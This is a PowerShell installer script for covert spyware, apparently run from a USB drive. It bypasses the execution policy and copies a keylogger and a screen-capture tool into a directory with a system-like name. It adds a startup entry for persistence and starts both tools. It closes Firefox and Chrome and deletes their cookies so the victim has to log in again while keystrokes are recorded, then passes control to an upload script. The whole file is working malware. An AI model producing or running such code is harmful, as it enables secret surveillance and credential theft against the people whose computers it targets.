#allow current user to run powershell scripts in the future
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

#place logger related files in a dedicated directory
New-Item -ItemType Directory -Force -Path "C:\ProgramData\WindowsUserAssist"
$drv = (Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter
Copy-Item "${drv}:\binaries\klog.exe"  "C:\ProgramData\WindowsUserAssist\UserAssist Klg Host.exe" -Force
Copy-Item "${drv}:\binaries\scap.exe"  "C:\ProgramData\WindowsUserAssist\UserAssist Scc Host.exe" -Force
Copy-Item "${drv}:\scripts\upload.ps1" "C:\ProgramData\WindowsUserAssist\UserAssist Updates.ps1" -Force
#copy autostart.vbs into windows startup directory, to launch the software at every login for current user
Copy-Item "${drv}:\scripts\autostart.vbs" "${env:APPDATA}\Microsoft\Windows\Start Menu\Programs\Startup\UserProfile.vbs" -Force

#start the softwares right away
Set-Location  "C:\ProgramData\WindowsUserAssist"
Start-Process "UserAssist Klg Host.exe"
Start-Process "UserAssist Scc Host.exe"

#close firefox/chrome web browsers, so that their cookies can be deleted
Stop-Process -Name Firefox
Stop-Process -Name Chrome
#delete firefox/chrome cookies, to make user logged out from online accounts
Remove-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\*.default*\cookies.sqlite" -Force -Recurse
Remove-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Cookies" -Force -Recurse

#eject the source usb drive
(New-Object -comObject Shell.Application).NameSpace(17).ParseName("${drv}:").InvokeVerb("Eject")

#pass execution to uploader script
.\"UserAssist Updates.ps1"